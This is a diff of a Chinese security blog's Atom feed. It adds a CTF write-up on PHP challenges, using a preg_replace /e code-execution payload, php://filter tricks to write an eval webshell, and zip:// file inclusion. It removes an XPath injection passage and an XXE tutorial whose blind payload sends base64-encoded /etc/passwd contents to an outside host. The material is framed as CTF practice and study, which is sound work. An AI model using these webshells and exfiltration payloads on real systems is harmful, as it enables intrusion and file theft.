@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-12-23T10:11:20.785Z</updated>
+  <updated>2018-01-01T14:35:47.801Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,103 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>week 7 for cnas writeup</title>
+    <link href="http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html"/>
+    <id>http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</id>
+    <published>2017-12-29T16:38:42.000Z</published>
+    <updated>2018-01-01T14:35:47.801Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
+<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
+<h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pattern</td>
+<td style="text-align:center">正则表达式</td>
+</tr>
+<tr>
+<td>replacement</td>
+<td style="text-align:center">替换的内容</td>
+</tr>
+<tr>
+<td>subject</td>
+<td style="text-align:center">需要匹配替换的对象</td>
+</tr>
+<tr>
+<td>limit</td>
+<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
+</tr>
+</tbody>
+</table>
+<h5 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h5><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
+<p>由以上知识点可以得到本题的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28001/01.php?a=/c/e&amp;b=system(&apos;cat flag.php&apos;)&amp;3=c</div></pre></td></tr></table></figure>
+<h2 id="exit-150"><a href="#exit-150" class="headerlink" title="exit 150"></a>exit 150</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">$c = &quot;&lt;?php exit;?&gt;&quot;; </div><div class="line">@$c.=$_GET[&apos;c&apos;]; </div><div class="line">@$filename = $_GET[&apos;file&apos;]; </div><div class="line">@file_put_contents($filename, $c); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>题目给出了源码，我们可以看出这里是利用file_put_contents()函数来写shell，但是写入的shell里开头会加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php exit;?&gt;;</div></pre></td></tr></table></figure>
+<p>导致shell中写入的内容无法被解析，这里我们就需要想办法绕过这段代码</p>
+<p>之前看过P神的一篇文章有讲过这个“死亡exit”的问题</p>
+<p>具体可以参考P神博客</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">谈一谈php://filter的妙用</a></p>
+<p>博客里介绍了三种方法绕过</p>
+<p>第一种使用php://filter/write=convert.base64-decode</p>
+<p>正如P神博客说的</p>
+<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</div></pre></td></tr></table></figure>
+<p>我本地环境可以写Shell，连接菜刀可以。但是题目环境不行。</p>
+<p>我们可以尝试写system函数读取flag，查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</div></pre></td></tr></table></figure>
+<p>第二种使用php://filter/write=string.strip_tags|convert.base64-decode/resource</p>
+<p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=z.php&amp;c=PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOz8+</div></pre></td></tr></table></figure>
+<p>这个payload跟php版本有关的，我本地5.4的可以。题目环境不行。</p>
+<p>第三种使用php://filter/write=string.rot13/resource</p>
+<p>利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。&lt;?php exit; ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg; ?&gt;，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.rot13/resource=a.php&amp;c=&lt;?cuc @riny($_CBFG[&apos;n&apos;]);?&gt;</div></pre></td></tr></table></figure>
+<p>菜刀链接，如果不连接不上可以用system函数。</p>
+<h2 id="easy-gallery-250"><a href="#easy-gallery-250" class="headerlink" title="easy_gallery 250"></a>easy_gallery 250</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="external">http://47.100.121.220:28003</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是jarvisoj平台的一个原题的改编，链接如下：</p>
+<p><a href="http://web.jarvisoj.com:32785" target="_blank" rel="external">http://web.jarvisoj.com:32785</a></p>
+<p>但是基本的利用点是相同的，那就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?page=</div></pre></td></tr></table></figure>
+<p>这个地方存在一个文件包含的漏洞，这个地方可以利用到</p>
+<p>具体可以看到我上传完后取下来的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require(&quot;header.php&quot;);</div><div class="line">	$page=&quot;&quot;;</div><div class="line">	if (isset($_GET[&apos;page&apos;]))</div><div class="line">		$page=$_GET[&apos;page&apos;].&quot;.php&quot;;</div><div class="line">	else</div><div class="line">		$page=&quot;main.php&quot;;</div><div class="line">	include($page);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这个地方加上了一个.php是一个利用点。</p>
+<p>根据原题的解题思路上传.jpg，然后利用这个文件包含点，%00截断是不行的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?page=图片ID.jpg%00</div></pre></td></tr></table></figure>
+<p>在甜哥提醒下还是利用到了PHP伪协议，突然发现PHP伪协议在CTF题目利用到的很多</p>
+<p>这里利用到zip://这个协议，具体可以参考我的博客</p>
+<p><a href="http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
+<p>这里我们可以结合zip://和文件包含来解析我们的shell</p>
+<p>具体，我们想写一个shell.php，zip打包，把扩展名改为.jpg上传</p>
+<p>在文件包含利用点用以下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/index.php?page=zip://uploads/图片ID.jpg#shell</div></pre></td></tr></table></figure>
+<p>根据zip协议的知识和view的代码，shell后加上.php后缀。这样就可以被解析了。</p>
+<p>我们就可以用菜刀连接到shell.php得到flag。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>week 6 for cnas writeup</title>
@@ -1126,7 +1223,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x66;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;">&#x66;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#46;&#x63;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
@@ -2358,65 +2455,6 @@
 <h3 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php require_once(&quot;../header.php&quot;);</div><div class="line"></div><div class="line">  $x = &quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;;</div><div class="line"></div><div class="line">  $xml=simplexml_load_string($x);</div><div class="line">  $xpath = &quot;users/user/name[.=&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;]/parent::*/message&quot;;</div><div class="line">  $res = ($xml-&gt;xpath($xpath));</div><div class="line">  while(list( ,$node) = each($res)) &#123;</div><div class="line">      echo $node;</div><div class="line">  &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
 <h4 id="Payload-30"><a href="#Payload-30" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos; 加单引号报错</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or &apos;1&apos;=&apos;1 得到两个name值</div><div class="line"></div><div class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or 1=1]/parent::*/child::node()%00 得到所有值</div></pre></td></tr></table></figure>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/" target="_blank" rel="external">[PentesterLab] Web for Pentester - FINAL</a><br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="external">慎用preg_replace危险的/e修饰符(一句话后门常用)</a><br><a href="http://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="external">PHP create_function()代码注入 (执行脚本函数）</a><br><a href="http://www.uml.org.cn/test/201507204.asp" target="_blank" rel="external">Web渗透测试攻略(上)</a><br><a href="http://www.uml.org.cn/test/201507205.asp" target="_blank" rel="external">Web渗透测试攻略(中)</a><br><a href="http://www.uml.org.cn/test/201507206.asp" target="_blank" rel="external">Web渗透测试攻略(下)</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>XML实体注入漏洞的利用与学习</title>
-    <link href="http://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
-    <id>http://uknowsec.cn/posts/notes/XML实体注入漏洞的利用与学习.html</id>
-    <published>2017-07-18T05:34:42.000Z</published>
-    <updated>2017-07-20T02:53:35.094Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><h4 id="使用simplexml-load-string函数解析body"><a href="#使用simplexml-load-string函数解析body" class="headerlink" title="使用simplexml_load_string函数解析body"></a>使用simplexml_load_string函数解析body</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = file_get_contents(&apos;php://input&apos;);</div><div class="line">$xml = simplexml_load_string($data);</div><div class="line">echo $xml-&gt;name;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><h4 id="漏洞测试方式1"><a href="#漏洞测试方式1" class="headerlink" title="漏洞测试方式1"></a>漏洞测试方式1</h4><p>有回显，直接读取文件</p>
-<p>Payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe.png" alt=""></p>
-<h4 id="漏洞测试方式2"><a href="#漏洞测试方式2" class="headerlink" title="漏洞测试方式2"></a>漏洞测试方式2</h4><p>无回显，引用远程服务器上的XML文件读取文件</p>
-<p>Payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxe.com/1.xml&quot;&gt;</div><div class="line">%remote;]&gt;</div></pre></td></tr></table></figure>
-<p>将以下1.xml保存到WEB服务器下<br>1.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % a SYSTEM &quot;file:///etc/passwd&quot;&gt; </div><div class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &apos;gopher://xxe.com/%a;&apos;&gt;&quot;&gt; %b; %c</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe1.png" alt=""></p>
-<p>查看服务器access.log，可以看到访问日志<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe3.png" alt=""></p>
-<h4 id="漏洞测试方式3"><a href="#漏洞测试方式3" class="headerlink" title="漏洞测试方式3"></a>漏洞测试方式3</h4><p>在主机上放一个接收文件的php(get.php):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">file_put_contents(&apos;01.txt&apos;, $_GET[&apos;xxe_local&apos;]);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>1.xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload	SYSTEM	 &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://xxe.com/get.php?xxe_local=%payload;&apos;&gt;&quot;&gt;</div><div class="line"></div><div class="line">%int;</div><div class="line"></div><div class="line">%trick;</div></pre></td></tr></table></figure></p>
-<p>这个XML，他引用了外部实体etc/passwd作为payload的值，然后又将payload拼接到<a href="http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。" target="_blank" rel="external">http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。</a></p>
-<p>接收到请求的get.php就将这个文件内容保存到01.txt了，形成了一个文件读取的过程。</p>
-<p>发包过去后，就会请求1.xml，解析这个xml造成XXE攻击，读取etc/passwd并进行base64编码后传给get.php，最后保存到主机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe2.png" alt=""></p>
-<p>查看服务器access.log，可以看到访问日志<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe4.png" alt=""></p>
-<p>查看01.txt<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe5.png" alt=""></p>
-<p>base64解码<br><img src="http://obr4sfdq7.bkt.clouddn.com/xxe6.png" alt=""></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe7.png" alt=""><br>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/xxe8.png" alt=""></p>
-<h2 id="XXE-危害"><a href="#XXE-危害" class="headerlink" title="XXE 危害"></a>XXE 危害</h2><ul>
-<li>读取任意文件</li>
-<li>执行系统命令</li>
-<li>探查内网端口</li>
-<li>攻击内网网站</li>
-</ul>
-<h3 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
-<h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
-<h3 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
-<h3 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h3><p>结合其他的漏洞比如：struts2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure></p>
-<h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>方案一、使用开发语言提供的禁用外部实体的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line"></div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line"></div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure>
-<p>方案二、过滤用户提交的XML数据</p>
-<p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://github.com/phith0n/vulhub/tree/master/php_xxe" target="_blank" rel="external">vulhub/php_xxe/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-098591.html" target="_blank" rel="external">Z-BLOG Blind-XXE造成任意文件读取 </a></p>
 ]]></content>
     
     <summary type="html">
